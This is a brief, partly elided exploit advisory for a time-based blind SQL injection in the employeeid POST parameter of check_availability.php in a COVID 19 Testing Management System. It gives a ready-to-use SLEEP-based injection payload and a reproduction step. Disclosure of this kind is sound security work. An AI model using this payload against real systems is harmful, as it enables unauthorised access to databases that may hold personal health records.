# Exploit Title: COVID 19 Testing Management System – SQL Injection in check_availability.php (`http://localhost/covid19tms/covid-tms/check_availability.php`)
...
- **URL:** `http://localhost/covid19tms/covid-tms/check_availability.php`
- **HTTP Method:** POST
...
- **Type:** time-based blind
  ...
  - **Payload:** `employeeid=1' AND (SELECT 7799 FROM (SELECT(SLEEP(5)))SJUn)-- gevc`
...
1. Browse to `http://localhost/covid19tms/covid-tms/check_availability.php`.  
